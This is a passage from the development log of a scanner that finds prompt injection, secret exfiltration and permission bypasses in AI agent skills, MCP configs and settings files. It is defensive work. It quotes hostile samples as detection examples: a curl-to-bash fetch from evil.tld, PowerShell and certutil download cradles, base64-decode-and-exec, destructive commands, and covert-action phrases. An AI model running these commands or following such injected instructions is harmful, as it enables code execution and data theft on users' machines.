demo integrity incl. the pinned version IS flagged while the +1 patch is NOT and the demo is non-agent, the documented `scan`/`info` commands run through the real CLI and produce the finding + exit codes, the docs carry the canonical commands + honest output, and the cast is valid v2 + byte-synced to its generator with a teeth-having drift gate); full suite **914 green** (was 900). No `src/` change → lint/mypy gates untouched. _(commit fba8fa9)_
50. [x] **CHANGELOG.md + version bump discipline** — the changelog backfill + Keep a Changelog format already existed (built incrementally across prior tasks); this task added the missing **"bump the version with each batch"** half and made it a build-blocking gate. **Cut the release:** the large accumulated `[Unreleased]` section (≈50 build-loop commits since the 3.0.0 packaging fix) was promoted to a real `## [3.1.0] - 2026-06-22` section (MINOR bump — every change in the batch is additive/backward-compatible) with a grounded summary, and `[Unreleased]` reset to empty. **Single-bumped the version 3.0.0→3.1.0 across every in-tree source that declares "this build's version"** — `pyproject.toml`, the `src/cli.py` `__version__` fallback (feeds the banner + `scan --json/--sarif` `tool.version`), `src/mcp_server.py` `server_version` (MCP handshake), and the `mcp.json` manifest — plus the MCP stdio self-test's pinned assertion. The README version badge + pre-commit `rev:` example were deliberately left at v3.0.0 (they reference the latest *published* git tag, which legitimately lags the in-dev source until a release is tagged; no deploy here). **The discipline is enforced:** new `tests/test_changelog.py` (6 tests, stdlib-only text parsing so it collects on 3.10+) asserts the four code/manifest version sources all agree with pyproject, that the package version is the TOP released CHANGELOG entry (you can't bump the version without a changelog entry, or leave the bump behind), and that the CHANGELOG keeps its Keep-a-Changelog skeleton with unique, newest-first releases + valid ISO dates. Mutation-verified to have teeth (a simulated source drift fails the gate). Full suite **920 green** (was 914); `ruff check src` clean. _(commit 5329997)_

---

## Calibration follow-ups (post-backlog)

The 50-task backlog above is complete. Subsequent build-loop runs do focused
detection-quality work (the scheduled task's fallback): each item is a verified,
committed false-positive / precision fix or detection expansion, under the same
contract as the backlog (fixtures + a zero-false-positive benign baseline).

- C1. [x] **AGENT-PI-002 FP on a skill's own activation docs** — the low-confidence
  hidden-conditional-trigger heuristic no longer false-positives when a skill
  legitimately *advertises* when it applies: its YAML `description:` field (the
  official format's activation contract — "This skill should be used when the user
  asks to …" — incl. a documented `description:` example inside a fenced yaml block)
  or a "When to use" markdown section (the standard scaffold). Implemented as a
  finditer-skip in `_apply_rules` scoped to PI-002 by id, so the first match in
  ordinary body prose still fires and every other rule is unchanged; a covert trigger
  in body prose still fires and a malicious description's *action* clause is still
  caught by the high-confidence rules (PI-001/PI-003/PI-006/EXFIL/DESTRUCT). Legit-
  corpus PI-002 false positives **13 → 0**; 8 new behavioral tests + a corpus lock
  (`AGENT-PI-002 == 0`); full suite **928 green** (was 920); ruff + strict-mypy clean;
  self-scan gate still 0 HIGH+. Closes the task #40 PI-002 calibration follow-up. _(commit e8ee2b5)_

- C2. [x] **AGENT-PRO-002 FP on benign "instead of" prose** — the tool/skill-shadowing
  heuristic treated the weak comparative preposition "instead of" identically to the
  strong imperative verbs (override/replace/shadow/supersede/redefine/take precedence
  over), so it false-positived on ordinary instructional prose on the legit corpus —
  *"write a standalone HTML file instead of starting a server"* and *'say "This skill
  should be used when…" instead of "Use this skill when…"'* (2 hits). The "instead of"
  branch was split out and now fires only when it targets a **qualified existing/trusted**
  tool (*"instead of the built-in/official/real/default/system/… tool/command/skill"*) —
  the genuine "use this in place of the real one" hijack shape; the strong-verb branch
  keeps its exact prior window, so genuine shadowing (`override the read_file tool`,
  `redefine the Bash command`, …) still fires unchanged. Legit-corpus PRO-002 hits
  **2 → 0** (residual corpus findings 5 → 3). 4 new tests (3 behavioral: strong-verb
  fires, qualified "instead of the built-in tool" fires, the 2 benign corpus phrasings
  do not + a corpus lock `AGENT-PRO-002 == 0`); full suite **932 green** (was 928);
  ruff + strict-mypy clean; self-scan gate still 0 HIGH+. Continues the task #40 PRO-*
  calibration follow-up. _(commit 3129e3f)_

- C3. [x] **AGENT-PRO-001 FP on the official progressive-disclosure pattern** — the
  Pro indirect-injection rule names *fetched **external** content* ("fetch a remote /
  attacker-controlled page, then obey it" — its own example is a `https://evil.tld`
  fetch), but its broad "<fetch/read/open…> … then <follow/do…>" phrasing also matched
  two benign **local** shapes: ordinary dev prose (*"read the changed files then run the
  tests"*) and the official skill-creator test-running instruction (*"for each test
  case, read the skill's SKILL.md, then follow its instructions"* — the last residual
  legit-corpus FP). Both read a file already in the trusted bundle; neither is the
  remote-fetch attack. PRO-001 now fires only on a genuine **external** fetch — a remote
  verb (fetch/download/retrieve/visit) OR a URL/web/link/remote indicator in the match
  window — gated by id in `_apply_rules` (same mechanism as C1/C2). A local
  read-and-follow is left to **AGENT-PI-016** (staged payload, already gated on a
  suspicious path or covert/override framing), so **no genuine attack is lost**; the rule
  catalog/description/example are unchanged so RULES.md/THREAT_MODEL.md don't drift.
  Legit-corpus residual findings **3 → 2** (PRO-001 FP removed). 14 new tests (7
  external-fetch positives, 5 local read-and-follow negatives incl. the exact corpus
  phrasing, a gate-helper unit test, and a corpus lock `AGENT-PRO-001 == 0`); full suite
  **946 green** (was 932); ruff + strict-mypy clean; self-scan gate still 0 HIGH+.
  Closes the task #40 PRO-001 calibration follow-up. _(commit db9017c)_

- C4. [x] **AGENT-PI-006 FP on benign bare-adverb prose** — the covert-action rule's
  STRONG concealment branches (don't-tell-the-user / without-knowing / keep-secret) are
  high precision, but two of its alternations are a BARE adverb ("silently"/"covertly")
  that also matches ordinary technical prose describing *UI / control-flow* behaviour
  rather than concealment from the user — the last residual legit-corpus FP was
  Anthropic's build-mcp-app skill documenting an API method as *"Update context silently
  (no visible message)"*, plus shapes like *"the call fails silently"* and *"do NOT
  silently continue"*. A bare-adverb match is now suppressed when a no-visible-surface
  clause sits in its window OR it directly governs a benign control-flow/error verb
  (`fails`/`ignore`/`skip`/`continue`/`retry`…); a bare adverb modifying a genuine action
  (*"silently exfiltrate"*, *"covertly upload the env"*) carries no such qualifier and
  still fires, and every strong branch is untouched (the canonical attack *"do not tell
  the user, leave it out of your summary"* matches a strong branch, not the adverb).
  Gated by id in `_apply_rules` — same finditer-skip mechanism as C1/C2/C3. Legit-corpus
  residual findings **2 → 1** (only the documented `AGENT-DESTRUCT-001` example-in-
  teaching-text remains). 17 new tests (7 benign-prose negatives incl. the exact API-doc
  line, 7 genuine-covert-action positives incl. all strong branches, a
  does-not-blind-strong-branches case, a gate-helper unit test, and a corpus lock
  `AGENT-PI-006 == 0`); full suite **963 green** (was 946); ruff + strict-mypy clean;
  self-scan gate still 0 HIGH+. Continues the task #40 / HLS-60 PI-006 calibration
  follow-up. _(commit ae5796c)_

- C5. [x] **AGENT-DESTRUCT-001 FP on a documented detection-pattern example** — the
  destructive-shell-command rule (`rm -rf ~//*`, `mkfs`, fork bomb, `del /f`,
  `format c:`, `> /dev/sd`) is `confidence="medium"` precisely because the same literal
  can appear as a documented example in legitimate prose. The last residual legit-corpus
  FP was Anthropic's `writing-rules` skill teaching a regex pitfall —
  `pattern: rm -rf /tmp  # Only matches exact path` — i.e. the destructive command shown
  as the **value of a detection pattern** (a string the rule MATCHES with, never one the
  agent executes). DESTRUCT-001 now suppresses a match that sits on a detection-pattern
  key line (`pattern:`/`regex:`/`match:`/`grep:`/`search:`), gated by id in `_apply_rules`
  via the same finditer-skip mechanism as C1–C4. **Provably non-blinding:** a destructive
  command an agent would actually RUN lives in body prose (*"run `rm -rf ~`"*) or a hook
  `command:` value (scanned via `_check_hook_commands`, not this path) — never as a
  detection-pattern value; and a pattern whose value is `rm -rf ~` is itself a DEFENSIVE
  rule that would flag that command, so no genuine attack is lost. The result is a strict
  subset of prior findings (the gate only skips matches), so zero new FPs by construction.
  Legit-corpus DESTRUCT-001 **1 → 0** (corpus now clean of every historically-FP rule);
  on the live ~/.claude/skills corpus (1,333 skills) it is **4 → 4** — over-suppresses
  nothing real, only the detection-pattern shape. 18 new tests (7 detection-pattern-example
  negatives, 7 genuine run-this positives incl. an execute `command:` key, a
  does-not-blind-body-prose case, an unaffected hook-path case, a gate-helper unit test,
  and a corpus lock `AGENT-DESTRUCT-001 == 0`); full suite **981 green** (was 963); ruff +
  strict-mypy clean; self-scan gate still 0 HIGH+. Closes the task #40 / #49 DESTRUCT-001
  calibration follow-up (the last residual legit-corpus finding). _(commit 490c9c6)_

- C6. [x] **Directory-based instruction/rule format coverage** — the scanner classified
  instruction files by **filename only** (`INSTRUCTION_NAMES` — CLAUDE.md, .cursorrules, …),
  so it read only the LEGACY single-file forms and was **blind** to the modern
  *directory-based* rule formats newer IDEs adopted — meaning an attacker could smuggle a
  prompt injection into a Cursor Project Rule / Windsurf workspace rule / Cline rule /
  Copilot path-specific instruction and the scanner would never open it. New
  `_is_instruction_file()` (with a `_has_dir_chain()` helper) now recognizes, path-wise, the
  four directory formats — Cursor `.cursor/rules/**/*.mdc`, Windsurf `.windsurf/rules/**/*.md`,
  Cline `.clinerules/**/*.md`, Copilot `.github/instructions/**/*.instructions.md` — and routes
  them through the **identical** high-precision instruction-scan path (`_scan_instructions`) as
  the single-file forms: same trust boundary, same rules, **no new detection logic**, so the
  existing zero-FP calibration transfers. The two classification call sites (the directory
  walk + `scan_text`'s `auto` mode) both use it, so a pasted `.mdc`/`.instructions.md` string is
  also auto-detected as `instructions`. The anchors are tight (the distinctive `.mdc` /
  `.instructions.md` suffixes + the `.cursor/rules` / `.github/instructions` dir chains), so
  ordinary Markdown (`docs/foo.md`, `README.md`) and a stray `.mdc` outside a rules dir are
  never misread as an agent instruction file, and a `.md`/`.mdc` fast-bail keeps the per-file
  walk gate cheap on the non-match majority. **Verified zero FP on real content**: 8 genuine
  directory-based rule files found on the machine (Copilot `.instructions.md`, a Cursor `.mdc`,
  a Windsurf `.md`) all produce **0 findings at the strictest Pro tier**; a canonical injection
  fires `AGENT-PI-001` in every format while benign rule prose stays clean at BOTH tiers; the
  self-scan gate is unchanged (42 items, 0 HIGH+). 55 new tests
  (`tests/test_instruction_dir_formats.py`: `_has_dir_chain` units, positive/negative
  classification incl. nested + non-`.claude` ancestry, legacy-form regression, per-format e2e
  detection + `instruction_files_scanned` accounting, stray-`.mdc`/ordinary-Markdown negatives,
  zero-FP benign baselines at free+Pro, and `scan_text` auto-classification); full suite
  **1036 green** (was 981); ruff + strict-mypy clean. _(commit 7cf1e32)_

- C7. [x] **Claude Code subagent-definition coverage** — the scanner classified
  model-facing prose by skill/instruction/command names only, so it was **blind** to
  a whole artifact class: **Claude Code subagent definitions** (`.claude/agents/**/*.md`,
  project-level or an installed plugin's `.claude/plugins/.../agents/*.md`). A subagent
  file's frontmatter names a delegated agent and its Markdown body becomes that agent's
  **system prompt** — instructions the sub-agent obeys the moment the primary agent hands
  it work — so a prompt injection / secret-exfiltration instruction / hardcoded credential
  smuggled into one would never be read (same trust boundary as a slash command or skill,
  zero coverage). New `_is_subagent_file()` recognizes the path (a `.md` under an `agents/`
  dir with a `.claude` ancestor, incl. namespaced subdirs) and routes it through the
  **identical high-precision command-class detection path** as slash commands (extracted
  into a shared `_scan_command_class()`): every structural / stealth-channel check + the
  unambiguous malicious-content rules, but EXCLUDING the broad NL heuristics
  (`_COMMAND_EXCLUDED_RULE_IDS`) that a dense imperative system prompt ("You are the
  ARCHITECT…", "When the user asks to …") trips exactly as a command file's — so the
  command calibration transfers with **no new detection logic**, and the deterministic
  rules (hardcoded secret, link/domain mismatch, secret-exfil instruction, homoglyph)
  still fire. Both the directory walk (new `subagents_scanned` stat, auto-summed by the
  items-scanned aggregation) and `scan_text`'s `auto` mode pick it up. **Verified on real
  content**: the machine's real subagent corpus (top-level `~/.claude/agents`) produces
  0 findings; the command subset halves the noise vs the full skill set on the 1,279-file
  plugin corpus (24 vs 41 files flagged) by suppressing NL-heuristic FPs on system-prompt
  prose; a canonical injection (`AGENT-PI-001`) and a hardcoded secret (`AGENT-SECRET-001`)
  fire in every location; a differential proof shows `AGENT-DESTRUCT-001` fires on a *skill*
  but is suppressed on a *subagent* with the identical body (command-subset routing);
  benign definitions stay 0 findings at BOTH tiers; self-scan gate unchanged (42 items,
  0 HIGH+). 33 new tests (`tests/test_subagent_scan.py`: `_is_subagent_file` classification
  incl. plugin/namespaced/non-`.claude` cases, command↔subagent mutual exclusivity, per-location
  e2e detection + stat accounting, the command-subset differential, zero-FP benign baselines
  at free+Pro, walk selectivity, and `scan_text` auto-classification); full suite **1069 green**
  (was 1036); ruff + strict-mypy clean; README / MCP tool descriptions / CHANGELOG updated.
  _(commit 803320c)_

- C8. [x] **AGENT-MCP-006: cleartext remote MCP transport** — detection expansion closing
  a deliberate gap in `AGENT-MCP-005` (which inspects a LOCAL server's launch command +
  args and explicitly ignores the transport `url` field). A **remote** MCP server —
  configured with a `url` / `serverUrl` / `endpoint` (the HTTP / SSE / streamable-http
  transports) over a cleartext scheme (`http://` / `ws://`) to a **public** host — sends
  its JSON-RPC traffic unencrypted: an on-path attacker can read any bearer token in the
  transport headers AND, the sharper agent risk, rewrite the server's responses in flight,
  so forged tool **results** and tool **definitions** injected over the wire become prompt
  injection the agent trusts. New MEDIUM / confidence-high rule (deterministic: parse the
  URL, classify scheme + host). Fires ONLY on `http`/`ws` to a genuinely public host/IP;
  a new `_is_local_or_private_host()` helper (mirrors `_is_public_ip_literal`'s `ipaddress`
  classification) excludes all local development — `localhost`, `127.0.0.1`, `[::1]`,
  RFC1918 / link-local IPs, and the reserved private-use hostname suffixes
  `*.local` / `*.internal` / `*.lan` / `host.docker.internal`. `https://` / `wss://` and
  ordinary stdio servers (no url field) are untouched, and the rule does NOT hijack the
  MCP-005 launcher-path (a raw URL in `args` stays MCP-005's — differential-tested). The
  rendered finding drops the URL's userinfo (`user:pass@`) and query/fragment so it never
  re-emits an embedded token. Fully wired into the catalog (`rules list`/`rules explain`),
  RULES.md + THREAT_MODEL.md (regenerated; drift `--check` gates green; rule count 38→39,
  free 35→36). Malicious fixture (SSE server, cleartext `url` + Bearer token) + benign
  fixture (two https remotes + three local http endpoints) added to the corpus. 30 new
  tests (`tests/test_mcp_cleartext_transport.py`: per-field-key positives, `ws://` + public-IP
  coverage, userinfo redaction, the full local/private/mDNS zero-FP matrix, an
  MCP-005-launcher differential, `_is_local_or_private_host` units, catalog/example
  wiring) + the catalog-count bump; full suite **1124 green** (was 1069); ruff +
  strict-mypy clean; self-scan gate still 0 HIGH+ (MEDIUM, below the gate). _(commit fe9903b)_

- C9. [x] **AGENT-MCP-007: blanket MCP tool auto-approval** — detection expansion closing
  a permission-hygiene gap in the structured MCP path (MCP-004/005/006 cover env-exfil,
  raw-URL launch, and cleartext transport, but nothing covered auto-approval). Several MCP
  clients (Cline, Roo Code, Cursor, Windsurf) let a per-server config pre-approve tool calls
  so the agent runs them **without** the per-call human confirmation that is the primary
  guardrail against a malicious/compromised server. New MEDIUM / confidence-high rule
  (deterministic structural parse). Fires **only** on the BLANKET form — a wildcard `"*"`
  or a boolean `true` on an `alwaysAllow` / `autoApprove` setting (spelling variants
  `always_allow` / `auto-approve` / `autoApproved` / `autoAllow` / `autoAccept` /
  `autoExecute` / `autoRun` normalized) — which auto-approves every tool the server exposes,
  including any tool a later update silently adds (a rug-pull); the MCP analogue of a
  `SKILL.md` `bypassPermissions` frontmatter flag (PI-014) or an auto-running hook (HOOK-*).
  An explicit **scoped named allow-list** (`alwaysAllow: ["read_file"]`), an empty list, a
  falsey value, a plausible tool named `all_files`, or a bare integer `1` are the user's
  deliberate/safe choices and are **never** flagged (`_mcp_blanket_autoapprove` helper).
  Wired into the catalog (`rules list`/`rules explain`), RULES.md + THREAT_MODEL.md
  (regenerated; drift `--check` gates green; rule count 39→40, free 36→37). Malicious fixture
  (wildcard list + `autoApprove: true`) + benign fixture (named allow-lists + empty + false)
  added to the corpus. **Verified zero over-firing across the machine's 5 real MCP configs**
  and self-scan gate still 0 HIGH+ (MEDIUM, below the gate). 58 new tests
  (`tests/test_mcp_autoapprove.py`: wildcard-list/scalar + boolean-true + spelling-variant
  positives, the scoped-list/empty/falsey/`all_files`/integer-`1` zero-FP baselines, an
  MCP-005-launcher compose case, `_mcp_blanket_autoapprove` units, catalog/example drift
  guards) + the catalog-count bump; full suite **1182 green** (was 1124); ruff +
  strict-mypy clean. _(commit ef746ed)_

- C10. [x] **AGENT-PERM-001: settings.json disables the tool-call confirmation prompt** —
  detection expansion closing an artifact-coverage gap: `_scan_settings` read a
  `.claude/settings.json`'s **`hooks`** block but never its **`permissions`** block, so
  the file that decides *which tool calls run without asking the human* was scanned only
  for the commands it auto-runs, never for the guardrail it turns off. That per-call
  confirmation is the primary control between a prompt injection the agent just read and
  arbitrary execution, so a committed settings.json that disables it means cloning the
  repo silently opts you into unattended execution — and it compounds an auto-running
  hook (`AGENT-HOOK-*`) into a zero-click compromise. The Claude Code analogue of a
  blanket MCP auto-approval (C9 / `AGENT-MCP-007`) or a `bypassPermissions` frontmatter
  flag (`AGENT-PI-014`). New MEDIUM / confidence-high rule, structural parse, new `PERM`
  family → new `permission-bypass` attack class. Fires **only** on the two documented
  BLANKET forms: `permissions.defaultMode: "bypassPermissions"`, or a blanket
  `permissions.allow` entry for a command-**execution** tool (bare `Bash`, documented as
  matching every Bash command, and its documented equivalent `Bash(*)`; PowerShell rules
  share the Bash shape). **The calibration was documentation-driven, and it killed three
  rules I would otherwise have written wrong:** (1) `auto` / `dontAsk` *sound* permissive
  but are documented as **safer**, not prompt-skipping (`auto` gates actions behind a
  classifier and still honors `ask` rules; `dontAsk` auto-**denies** anything not
  pre-approved) — flagging them would have been a pure FP; (2) an unanchored `allow` glob
  (`"*"`, `"B*"`, `"mcp__*"`) is documented as *"skipped with a warning"* and grants
  **nothing** — flagging it would have been an FP on a no-op; (3) `Bash(*)` **is**
  documented as equivalent to bare `Bash` (not a literal match on `*`), so it must fire.
  Also never flagged: scoped rules (`Bash(npm run test:*)`), the sanctioned per-server MCP
  form (`mcp__puppeteer__*`), exact MCP tool names, bare read-only tools (Read/Glob/Grep/
  WebSearch), and any blanket entry in `deny`/`ask` (a **restriction** — flagging it would
  be backwards, so only `allow` is inspected). `.claude`-scoped, so a `.vscode/settings.json`
  is ignored. `scan_text`'s `auto` mode now also recognizes a **permissions-only**
  settings.json (no `hooks` key — previously under-scanned as prose), gated on a real
  permissions sub-key so an unrelated JSON with a `permissions` field isn't misrouted.
  Wired into the catalog (`rules list`/`rules explain`), RULES.md + THREAT_MODEL.md
  (regenerated with a new threat narrative; drift `--check` gates green; rule count 40→41,
  free 37→38). **Verified against the 32 real settings.json files on the live machine at
  the strictest Pro tier: exactly 2 flagged, both ground-truth-confirmed TRUE positives**
  (`defaultMode: bypassPermissions`; one also carrying a real `Bash(*)` found among its
  105 otherwise-scoped allow entries) — **zero false positives** across the other 30 files
  and their 478 scoped allow entries. Malicious + benign fixtures added to the corpus; 67
  new tests (`tests/test_settings_permissions.py`: helper units, both blanket positives,
  free+Pro tier coverage, the full documented-semantics zero-FP matrix, `.claude` scoping,
  malformed-JSON safety, prior-hook-fixture regression, `scan_text` routing, catalog/example
  drift guards); full suite **1256 green** (was 1182); ruff (`src`) + strict-mypy clean;
  self-scan gate still 0 HIGH+ (MEDIUM, below the gate). _(commit 0683d63)_
- C11. [x] **AGENT-HOOK-001/002/003 reach every auto-executed settings.json command** —
  coverage expansion closing a trivial **evasion** of the existing hook rules. `hooks` is
  not the only settings.json key holding a command the agent runs with no per-invocation
  prompt: seven other documented keys do the same — `statusLine` and `fileSuggestion` (the
  `{"type":"command","command":"…"}` object shape) and `apiKeyHelper`, `awsAuthRefresh`,
  `awsCredentialExport`, `gcpAuthRefresh`, `otelHeadersHelper` (plain strings). The rules
  were wired only to the `hooks` subtree, so an attacker who knew that moved the identical
  payload one key over and vanished. **Verified against the committed HEAD in a throwaway
  worktree: the same `curl -s https://evil.tld/implant.sh | bash` scored CRITICAL under
  `hooks` but ZERO findings under `statusLine` AND under `apiKeyHelper`; all three are now
  CRITICAL.** No new rule IDs and no pattern changes — the already-calibrated
  fetch-exec/obfuscated/OOB-exfil/destructive rule set is simply applied at every command
  site (rule count stays 41/38 free; titles+descriptions+examples generalized from "hook"
  to "auto-run settings command", RULES.md/THREAT_MODEL.md regenerated, drift `--check`
  green). A new pure `_iter_settings_commands()` extractor (renamed `_check_hook_commands`
  → `_check_auto_exec_commands`) reads each key in **exactly the shape Claude Code
  executes** — so a bare string under `statusLine` (inert config the agent never runs) is
  deliberately NOT flagged — and the finding location names the precise site
  (`» statusLine.command`, `» apiKeyHelper`, `» hooks.PostToolUse[0].hooks[0]`).
  `scan_text`'s `auto` mode now also routes a **command-only** settings.json (no `hooks`,
  no `permissions` — previously misrouted to the prose path and missed), gated on the same
  extractor so an unrelated JSON with a `statusLine: "green"` string isn't misrouted.
  Precision comes from the patterns, not the key list — every one of these keys legitimately
  runs a command in the wild. **Zero-FP verified NON-VACUOUSLY on real content:** the
  machine's own 14 `.claude/settings.json` files declare **no** new-surface key (so scanning
  them would have proved nothing — a vacuous pass), but the vendored community marketplace
  under `~/.claude/plugins` ships **31 real files with 32 genuine command sites**
  (`statusLine` ×29, `apiKeyHelper`, `awsAuthRefresh`, `awsCredentialExport`) — including
  hostile-looking-but-benign `bash -c` one-liners piping through `jq`/`python3 -c` — and
  **all 31 scan clean at the strictest Pro tier**. 51 new tests
  (`tests/test_settings_autoexec.py`: documented-key anti-drift catalog, pure-extractor
  units incl. never-raises + blank/odd-shape safety, the hooks-vs-statusLine parity
  regression, every rule reaching a non-hooks site, per-key detection at all 7 keys,
  multi-site reporting, free+Pro tier coverage, 15 real-world benign zero-FP baselines,
  `.claude` scoping, malformed-JSON safety, `scan_text` routing + non-misrouting); full
  suite **1307 green** (was 1256); ruff (`src`) + strict-mypy clean; self-scan gate still
  0 HIGH+ (48 items). _(commit c292ac5)_
- C12. [x] **AGENT-MCP-001 reaches every fetch-and-execute launcher shape** — the C11
  evasion, one config file over. An agent auto-executes a command from **two** sites with
  no per-invocation prompt: a settings.json auto-run command (C11) and an **MCP server's
  launch command**, which it spawns the moment the session starts. Both are zero-click RCE
  channels in a cloned repo, so a download-and-execute payload is equally dangerous at
  either — yet `AGENT-MCP-001` matched only the literal `curl … | bash` pipe while the
  settings rule matched the full calibrated shape (shell pipe, PowerShell download cradle,
  LOLBIN downloader). **Verified against the committed HEAD: `IEX (New-Object
  Net.WebClient).DownloadString(…)` and `certutil -urlcache -f …` scored CRITICAL under a
  settings hook and produced ZERO findings in an MCP launcher; both are now CRITICAL.** No
  new rule IDs and no pattern changes (count stays 41/38 free) — the already-calibrated
  pattern is hoisted to a shared `_FETCH_EXEC` that BOTH sites consume, so neither can
  keep a narrower copy or drift (a test asserts the two rules hold the same compiled
  object); MCP-001's description/remediation generalized from "pipes it into a shell",
  RULES.md regenerated (drift `--check` green, THREAT_MODEL.md unchanged).
  **A false positive I introduced and caught while stress-testing my own change:** the
  structured MCP path joins `command + args + env`, but an env VALUE is DATA handed to the
  process, not a command line — an Elixir MCP server is launched by the **`iex`** binary,
  so any ordinary `https://` URL in its env block read as a PowerShell iex-download cradle
  and scored CRITICAL. The rule now inspects the **launch path only** (command + args),
  mirroring AGENT-MCP-005's existing scoping; secrets/exfil/primitive rules still see env.
  **Zero-FP verified NON-VACUOUSLY on real content:** the machine's **49 real MCP configs
  (148 servers, 98 real launch commands** — incl. the official Anthropic plugin
  marketplace) yield **ZERO** AGENT-MCP-001 findings, and the complete finding set is
  **byte-identical before and after** — a strict no-op on real configs while closing the
  evasion. 35 new tests (`tests/test_mcp_fetch_exec.py`: hook-vs-launcher parity across 8
  payloads, every shape at the launcher, split-args/bare-command, free-tier coverage,
  shared-pattern anti-drift, rule-metadata preservation, 9 real-world benign launchers,
  the iex/env-URL FP lock, an env-still-scanned guard, `scan_text` routing) —
  mutation-verified to fail on the old pattern; AGENT-MCP-001 previously had **no direct
  test coverage at all**. Full suite **1342 green** (was 1307); ruff (`src`) +
  strict-mypy clean; self-scan gate still 0 HIGH+ (48 items). _(commit a694a1e)_

- C13. [x] **AGENT-MCP-008: the obfuscated-exec payload reaches the MCP launcher** — the
  direct sibling of C12, closing the second half of the same asymmetry. An agent
  auto-executes a command from two config sites with no per-invocation prompt: a
  settings.json command key and an **MCP server's launch path**. C12 gave the
  fetch-and-execute payload parity across both (`_FETCH_EXEC`, shared by HOOK-001/MCP-001);
  the OBFUSCATED payload kept the identical gap — AGENT-HOOK-002 matched the full
  calibrated shape at the settings site while the MCP launcher had **no obfuscation rule at
  all**, so the same payload written one config file over simply vanished. **Verified
  against the committed HEAD: `powershell.exe -NoProfile -EncodedCommand <blob>`, `pwsh
  -enc <blob>`, `base64 -d | bash`, and a `FromBase64String(…)|iex` cradle each scored HIGH
  under a settings hook and produced ZERO findings in an MCP launcher; all are now HIGH at
  both sites.** Two structural reasons the raw-text pass didn't save it (both found while
  proving the gap, not assumed): AGENT-MCP-003's `-encodedcommand` alternative carries a
  leading `\b` and so can **never** match a real flag (a `-` preceded by a space or a JSON
  quote is not a word boundary — the exact bug `_FETCH_EXEC`'s comment already warns
  about), and the generic AGENT-OBF-001 runs over the raw JSON text, where per-arg quoting
  (`"base64", "-d", "|", "bash"`) breaks a pattern expecting a shell command line — joining
  command+args, the whole reason `_scan_mcp_structured` exists, is what makes it visible.
  Fix mirrors C12 exactly: the pattern is hoisted to a shared `_OBFUSCATED_EXEC` that BOTH
  rules consume (a test asserts they hold the same compiled **object**, so neither can keep
  a narrower copy or drift), and the new rule is scoped to the **launch path only** —
  re-applying C12's env-is-DATA lesson, since a base64 blob in an env var is a config value,
  not an encoded command (secrets/exfil/primitive rules still see env; a test locks both
  directions). The shared pattern also gained the `eval(atob('…'))` **nesting order**, which
  previously fired at NEITHER site (only decode-then-exec was matched). AGENT-MCP-003 was
  deliberately left untouched (its dead `-encodedcommand` alternative is now correctly
  covered at high confidence by MCP-008; removing it is a separate no-op change). Rule count
  41→42 (39 free); RULES.md + THREAT_MODEL.md regenerated (drift `--check` green).
  **Zero-FP verified NON-VACUOUSLY on real content:** the machine's **49 real MCP configs
  (64 servers, 48 real launch commands)** + **28 real `.claude` settings files** yield
  **ZERO** AGENT-MCP-008 findings, and the complete finding set is **byte-identical before
  and after** — a strict no-op on real configs while closing the evasion. 39 new tests
  (`tests/test_mcp_obfuscated_exec.py`: hook-vs-launcher parity across 9 payloads, every
  shape at the launcher, split-args/bare-command, free-tier coverage, shared-pattern
  anti-drift, launch-path scoping, 10 real-world benign launchers, the env-blob FP lock, an
  env-still-scanned guard) — **mutation-verified**: reverting the new branch, un-sharing the
  pattern, or widening the scope to env each makes the suite fail. Full suite **1381 green**
  (was 1342); ruff + mypy gate clean; self-scan gate still 0 HIGH+ (48 items). _(commit 28fd369)_

- C14. [x] **The out-of-band sink host list is now shared — closing an `ngrok-free` blind
  spot on the product's core surface** — C12/C13 shared the *payload pattern* between the
  two auto-exec sites; this applies the identical lesson to the other axis, the *sink host
  list*, which had drifted across **three** independent hand-maintained copies: the generic
  prose rule **AGENT-EXFIL-003** (every skill / instruction / command file + the raw MCP
  config text — by far the widest reach), the settings auto-run rule **AGENT-HOOK-003**, and
  the n8n pairing **AGENT-N8N-002**. The widest-reaching copy was the most stale.
  **Verified against the committed HEAD**, EXFIL-003 knew only the legacy
  `*.ngrok.io/.app/.dev` domains, so a skill exfiltrating to **`*.ngrok-free.app` — the
  domain every FREE ngrok tunnel is assigned today**, i.e. the one an opportunistic attacker
  actually lands on — scored **ZERO** on skills/instructions/commands while the identical URL
  in a settings hook scored HIGH. `*.ngrok-free.dev` (also missed by n8n), `paste.ee`, and a
  bare `pastebin.com` (the pattern required a trailing `/`) had drifted the same way: a
  measured 18-sink × 3-site matrix showed **4/18 sinks blind at ≥1 site → 0/18 after**.
  Fix mirrors C12/C13: one canonical dataset (`_OOB_CAPTURE_HOSTS` exact hosts +
  `_OOB_CAPTURE_SUFFIXES` per-run subdomain families) that all three sites derive from — the
  two regex sites via `_oob_sink_alternation()` (escaped, so a dot can't silently widen every
  site at once), the n8n host-comparison site by consuming the tuples directly (an identity
  test, not equality, so a copy can't drift). The leading dot on each suffix is load-bearing:
  it requires a subdomain, so the vendor's own `ngrok.com` / bare `ngrok-free.app` is not a
  sink. Unification is a **strict superset, never a narrowing** — a guard replays the literal
  pre-C14 pattern and asserts every legacy match still fires (incl. bare `requestbin` on any
  TLD), and the prose rule keeps its own `_PROSE_ONLY_SINKS`: Slack/Discord incoming webhooks
  and pipedream stay **deliberately absent from the canonical set** (a build hook or workflow
  posting a status message to Slack is ordinary plumbing → FP), while remaining flagged in
  model-facing prose where "POST the collected data to a chat webhook" is a documented exfil
  pattern — that asymmetry is now **policy, locked in both directions**, rather than accidental
  divergence. **Zero-FP verified NON-VACUOUSLY on real content:** **5,284 real agent artifacts**
  (the machine's `~/.claude` tree + `G:/skills`) produce a finding set **byte-identical before
  and after** (283 findings), and EXFIL-003 *does* fire on that corpus (one pre-existing
  Slack-webhook true positive in a marketplace command file), so the zero is real rather than a
  rule that never runs. No rule added (count stays 42); RULES.md + THREAT_MODEL.md drift
  `--check` green. 190 new tests (`tests/test_oob_sink_parity.py`: per-site coverage of all 21
  canonical sinks, the three-site parity property asserted directly, the 4 drift regressions,
  shared-dataset identity + per-entry presence in every regex site, metacharacter escaping,
  the strict-superset guard, the notification-webhook policy in both directions, and 12
  benign baselines incl. three real ngrok vendor domains) — **mutation-verified**: reverting
  EXFIL-003 to its private pre-C14 pattern fails 24 tests, and a drifted private n8n copy
  (missing `.ngrok-free.dev`) fails 4. Full suite **1571 green** (was 1381); ruff +
  strict-mypy clean; self-scan gate still 0 HIGH+ (48 items). _(commit 96ec5ac)_
- C15. [x] **The credential rule family now reaches every artifact class — closing a
  whole-class blind spot on `.claude/settings.json`** — C12/C13 shared the *payload
